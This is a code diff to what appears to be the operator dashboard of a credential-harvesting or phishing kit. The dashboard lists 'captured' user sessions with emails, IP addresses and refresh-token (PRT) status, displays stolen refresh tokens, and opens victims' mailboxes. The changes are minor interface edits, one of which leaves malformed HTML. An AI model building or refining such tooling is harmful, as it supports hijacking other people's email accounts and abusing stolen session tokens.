@@ -59,7 +59,7 @@
         <h3>📋 User Sessions</h3>
         <table>
             <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT Status</th><th>Captured At</th><th>Actions</th></tr></thead>
-            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading... </td></tr></tbody>
+            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...  </div>...</td></tr></tbody>
         </table>
     </div>
 </div>
@@ -92,7 +92,7 @@
     function renderTable(sessions) {
         const tbody = document.getElementById('sessionsTableBody');
         if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate. </td></tr>';
+            tbody.innerHTML = '</td><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.</td></tr>';
             return;
         }
         
@@ -127,13 +127,12 @@
                 <p><strong>PRT (Refresh Token):</strong></p>
                 <pre>${escapeHtml(data.refresh_token)}</pre>
                 <p style="font-size: 11px; color: #10b981;">✅ Access token refreshed and valid for ${data.expires_in} seconds</p>
-                <p style="font-size: 11px; color: #f59e0b;">🔄 PRT is permanent - use it to generate new access tokens</p>
             `;
         }
     }
 
     function openMailbox(sid, email) {
-        window.open(`/mailbox.html?sid=${sid}&email=${encodeURIComponent(email)}`, '_blank');
+        window.open(`/mailbox.html?sid=${sid}&email=${encodeURIComponent(email)}`, '_blank', 'width=1200,height=800');
     }
 
     function updateStats(sessions) {
